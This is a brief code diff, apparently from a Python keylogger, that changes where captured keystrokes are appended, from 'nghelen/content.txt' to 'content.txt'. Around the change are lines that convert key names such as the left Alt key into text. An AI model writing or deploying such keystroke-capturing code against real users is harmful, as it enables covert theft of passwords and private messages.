@@ -16,7 +16,7 @@ def nghe(key):
         ke="\n"
     if ke=="Key.alt_l":
         ke="<alt>"
-    with open("nghelen/content.txt","a",encoding="utf-8") as f:
+    with open("content.txt","a",encoding="utf-8") as f:
         f.write(ke)
 
     # print(ke)
